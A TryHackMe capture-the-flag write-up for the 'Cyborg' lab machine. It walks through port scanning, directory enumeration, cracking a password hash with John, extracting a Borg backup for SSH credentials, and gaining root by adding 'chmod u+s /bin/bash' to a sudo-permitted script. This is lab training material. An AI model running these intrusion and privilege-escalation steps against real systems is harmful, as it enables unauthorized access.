# TryHackMe - Cyborg Machine Report

![--](https://miro.medium.com/v2/resize:fit:720/format:webp/0*flpWg149E1VZ8Dhy.jpeg)

## Target IP
```
10.10.138.120
```

## 1. Port Scanning

```bash
nmap -sT -p- -oN Cyborg/fullscan.txt 10.10.138.120
```

### Output:
```
22/tcp  open  ssh
80/tcp  open  http
```

## 2. Directory Enumeration

```bash
gobuster dir -u http://10.10.138.120 -w /usr/share/wordlists/common.txt
```

### Output:
```
/admin
/etc
```

## 3. Hash Cracking from /etc

- Navigated to `/etc` directory.
- Found a string like: `music-archive : <hash>`
- Saved the hash to a file named `hash.txt` and cracked it using John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Output:
```
Password found: squidward
```

## 4. Exploiting Admin Panel

- Accessed `/admin` directory.
- Based on admin communication, identified **Borg Backup** usage.
- Downloaded `final_archive` from the web interface or discovered path.

## 5. Extracting Archive Contents

```bash
borg extract final_archive::music_archive
```

- The extraction revealed a directory named `home`.

```bash
cd home/alex/Documents
cat note.txt
```

- Found the password for user `alex`.

## 6. SSH Access & User Flag

```bash
ssh alex@10.10.138.120
```

- Logged in with the discovered password.
- Listed files and found the user flag:

```bash
ls
cat user.txt
```

## 7. Privilege Escalation

```bash
sudo -l
```

### Output:
```
User alex may run the following command on cyborg:
    (ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- Changed permissions and modified the script:

```bash
chmod 777 /etc/mp3backups/backup.sh
nano /etc/mp3backups/backup.sh
```

- Inserted the following line:

```bash
chmod u+s /bin/bash
```

- Saved and executed:

```bash
sudo /etc/mp3backups/backup.sh
/bin/bash -p
```

- Gained root shell, then:

```bash
cd /root
cat root.txt
```
